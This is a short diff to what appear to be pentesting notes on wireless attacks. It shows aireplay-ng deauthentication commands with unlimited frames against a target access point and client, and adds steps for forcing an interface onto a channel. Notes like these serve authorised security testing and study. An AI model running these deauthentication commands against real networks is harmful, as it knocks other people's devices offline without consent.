@@ -63,3 +63,13 @@ aireplay-ng --deauth 0 -a [bssid] -c [station] wlan0
 aireplay-ng --deauth 0 -a [bssid] wlan0
 ```
 {% endcode %}
+
+{% hint style="danger" %}
+to change channel forcefully&#x20;
+
+1\) _<mark style="color:blue;">ifconfig</mark> wlan0 down_
+
+_2) <mark style="color:blue;">iwconfig</mark> wlan0 channel 3_
+
+_3) <mark style="color:blue;">ifconfig</mark> wlan0 up_
+{% endhint %}
